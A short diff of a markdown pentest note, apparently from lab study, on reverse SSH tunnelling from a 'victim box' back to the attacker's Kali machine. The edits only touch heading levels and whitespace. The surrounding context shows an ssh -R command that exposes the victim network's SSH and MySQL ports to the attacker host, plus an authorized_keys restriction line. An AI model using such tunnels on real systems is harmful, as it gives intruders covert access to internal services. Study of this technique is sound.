@@ -2,9 +2,9 @@
 
 ## Connecting from victim box to our kali box and restricting access
 
-No password will be use, thus we will be using ssh keys. 
+No password will be use, thus we will be using ssh keys.
 
-#### Connecting to our kali ssh server
+### Connecting to our kali ssh server
 
 ```text
 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o
@@ -12,7 +12,7 @@ ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o
 kali@10.11.0.4
 ```
 
-#### Adding ssh public key to authorized hosts with restrictions. 
+### Adding ssh public key to authorized hosts with restrictions.
 
 ```text
 from="10.11.1.250",command="echo 'This account can only be used for port
